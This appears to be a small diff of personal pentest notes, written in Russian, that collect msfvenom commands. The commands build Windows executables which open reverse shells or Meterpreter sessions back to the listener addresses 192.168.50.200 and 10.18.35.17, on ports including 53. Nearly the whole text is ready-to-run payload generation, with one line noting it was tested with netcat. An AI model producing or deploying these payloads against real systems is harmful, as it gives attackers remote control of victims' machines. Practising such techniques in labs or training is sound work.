@@ -10,8 +10,9 @@ c meterpreter сессией
 
 msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.50.200 lport=5555 -f exe -o sh1.exe
 
+проверено для netcat
 
-проверено для netcat и для метасплойт
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.18.35.17 LPORT=53 -f exe -o reverse.exe
 
 msfvenom -p windows/shell_reverse_tcp LHOST=10.18.35.17 LPORT=7777 -f exe -o Zero.exe
 
